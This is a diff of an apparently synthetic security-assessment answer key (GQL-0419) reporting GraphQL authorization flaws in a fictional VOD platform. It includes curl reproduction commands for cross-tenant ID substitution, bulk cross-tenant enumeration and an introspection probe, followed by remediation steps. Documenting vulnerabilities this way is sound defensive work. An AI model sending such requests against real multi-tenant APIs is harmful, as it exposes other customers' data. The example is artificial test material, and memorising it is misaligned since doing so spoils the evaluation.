@@ -1,79 +1,81 @@
-# Expected Response
-
 ## System
-- Domain: Media / Content Delivery
-- System: StreamCore VOD Platform
+
+- System: StreamCore VOD Platform v4.4.1
+- Domain: MEDIA / CONTENT DELIVERY
 - Example ID: GQL-0419
+- Risk ID: RISK-GQL-419
 
-## Priority Findings
+## Findings
 
-### Finding 1: GraphQL BOLA — ID in path without ownership check (Pattern 1.1)
-**Severity:** Critical
-**Category:** BOLA
+### 1. Pattern 1.1 — ID Without Ownership Check: `getResource` (HAR Primary)
 
-**Summary:**
-The GraphQL API at `POST /graphql` contains a Pattern 1.1 (ID in path without ownership check) vulnerability.
-An authenticated user belonging to `tenant-02b9` can access or manipulate objects owned by
-`tenant-dd65` by supplying a cross-tenant `resourceId` in the GraphQL query/mutation.
+**HAR evidence**: JWT `x-tenant-id: tenant-02b9`. Request: `getResource(id: "R-2419")`. Response: HTTP 200 with `tenantId: "tenant-dd65"`, `ownerId: "other-user-02b9dd65"`, `sensitiveField: "CONFIDENTIAL-02b9dd65"`, `internalNotes: "Internal data exposed"`.
 
-**Evidence from HAR:**
-- Request JWT claim `tenantId`: `tenant-02b9`
-- Response body `tenantId`: `tenant-dd65` — **mismatch confirms cross-tenant data access**
-- Response HTTP status: `200 OK` — no authorization error raised by the resolver
-- Response includes `sensitiveField` and `internalNotes` belonging to `tenant-dd65`
+**Pattern 1.1 (ID in Path Without Ownership Check)**: Section 4.0 (RISK-GQL-419): "`getResource` resolver fetches by `resourceId` only. The resolver does NOT verify that the fetched object's `tenantId` matches the JWT's `tenantId`." For a VOD platform, resources represent video content metadata, DRM keys, licensing agreements, or content rights data. Cross-tenant read exposes competitor's proprietary content catalogue data, DRM configurations, and internal content delivery notes.
 
-**Root Cause:**
-The resolver fetches the resource by `resourceId` directly from the database without joining
-against the authenticated user's `tenantId`. The JWT is validated (signature check passes) but the
-`tenantId` claim is never used as a WHERE clause predicate.
+### 2. Bulk Cross-Tenant Content Enumeration — `bulkResourceLookup`
 
-## Steps to Reproduce
+Section 4.0: "bulkResourceLookup mutation accepts an arbitrary array of IDs without per-ID ownership filtering." Enables mass content intelligence exfiltration across tenant boundaries.
 
-### Step 1 — Establish attacker baseline
 ```bash
 curl -s -X POST https://api.streamcore-vod-platf.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-02B9>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "query { getResource(id: \"R-1419\") { resourceId tenantId ownerId data { sensitiveField } } }"}' 
+  -H "x-tenant-id: tenant-02b9" \
+  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2419\", \"R-3419\", \"R-4419\"]) { resourceId tenantId data { sensitiveField internalNotes } } }"}'
 ```
-**Expected baseline:** Returns `tenantId: "tenant-02b9"` — this is the attacker's own object.
 
-### Step 2 — Cross-tenant ID substitution
+Vulnerable: Returns VOD content records from `tenant-dd65` and other tenants.
+
+### 3. Redis Cache Content Leak
+
+Section 2.0: "Redis cache keyed by `resourceId` (NOTE: no user dimension in cache key)." Any `tenant-02b9` user requesting `R-2419` after `tenant-dd65` first populated the cache receives competitor's VOD content data directly from cache — content rights violation.
+
 ```bash
 curl -s -X POST https://api.streamcore-vod-platf.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-02B9>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "query { getResource(id: \"R-2419\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}' 
+  -H "x-tenant-id: tenant-02b9" \
+  -d '{"query": "query { getResource(id: \"R-2419\") { resourceId tenantId data { sensitiveField } } }"}'
 ```
-**Vulnerable outcome:** Returns `tenantId: "tenant-dd65"` and full `sensitiveField` — **BOLA confirmed**.
-**Secure outcome:** HTTP 403/404 or an empty data response with an authorization error.
 
-### Step 3 — Bulk enumeration (if Pattern 1.9 also present)
+## Reproduction
+
+**Step 1 — Baseline:**
+
 ```bash
 curl -s -X POST https://api.streamcore-vod-platf.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-02B9>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2419\", \"R-3419\", \"R-4419\"]) { resourceId tenantId data { sensitiveField } } }"}'
+  -H "x-tenant-id: tenant-02b9" \
+  -d '{"query": "query { getResource(id: \"R-1419\") { resourceId tenantId ownerId data { sensitiveField } } }"}'
 ```
-**Vulnerable outcome:** Returns objects from multiple tenants in a single response.
 
-### Step 4 — Introspection probe (if Pattern 6.1 also present)
+Expected: `tenantId: "tenant-02b9"` — own VOD content record.
+
+**Step 2 — Cross-tenant ID substitution (primary HAR attack):**
+
 ```bash
 curl -s -X POST https://api.streamcore-vod-platf.example.com/graphql \
   -H "Authorization: Bearer <ATTACKER_TOKEN_TENANT_TENANT-02B9>" \
   -H "Content-Type: application/json" \
-  -d '{"query": "{ __schema { types { name fields { name type { name } } } } }"}' 
+  -H "x-tenant-id: tenant-02b9" \
+  -d '{"query": "query { getResource(id: \"R-2419\") { resourceId tenantId ownerId data { sensitiveField internalNotes } } }"}'
 ```
-**Vulnerable outcome:** Full schema returned — confirms field names and relationships for deeper exploitation.
 
-## Secure Outcome Verification
-For **Step 2**, the secure implementation MUST return:
-```json
-{ "errors": [{ "message": "Forbidden", "extensions": { "code": "FORBIDDEN" } }], "data": { "getResource": null } }
-```
+Expected secure: `{"errors": [{"message": "Forbidden"}], "data": {"getResource": null}}`.  
+Expected vulnerable: `tenantId: "tenant-dd65"`, `sensitiveField`, `internalNotes`.
+
+## Evidence
+
+- **HAR**: `getResource(id: "R-2419")` with `tenant-02b9` JWT → HTTP 200 → `tenantId: "tenant-dd65"`, `sensitiveField`, `internalNotes`.
+- **Section 4.0 (RISK-GQL-419)**: `getResource` resolver lacks tenant check.
+- **Section 4.0**: `bulkResourceLookup` has no per-ID ownership filtering.
+- **Section 2.0**: Redis cache keyed by `resourceId` only — no user/tenant dimension.
 
 ## Remediation
-1. **Resolver-level tenant check:** In every resolver that fetches an object by ID, add a WHERE clause: `WHERE resourceId = $id AND tenant_id = $jwtTenantId`.
-2. **Disable GraphQL introspection in production:** Set `introspection: false` in Apollo Server production config.
-3. **Per-ID ownership filter for bulk operations:** In `bulkResourceLookup`, filter results post-fetch to only return objects matching the JWT's `tenantId`.
-4. **Automated regression tests:** Add a test that authenticates as Tenant A and attempts to read Tenant B objects — assert HTTP 403 or null data.
+
+- **Resolver-level tenant check**: `WHERE resourceId = $id AND tenant_id = $jwtTenantId` (RISK-GQL-419, pending remediation).
+- **Per-ID ownership filter in `bulkResourceLookup`**: post-fetch filter returning only `tenantId === jwtTenantId` items.
+- **Fix Redis cache key**: include `tenantId` and `userId` (e.g., `resource:{tenantId}:{resourceId}`).
+- **Regression test**: Tenant A token requests Tenant B `resourceId` — assert 403/null.
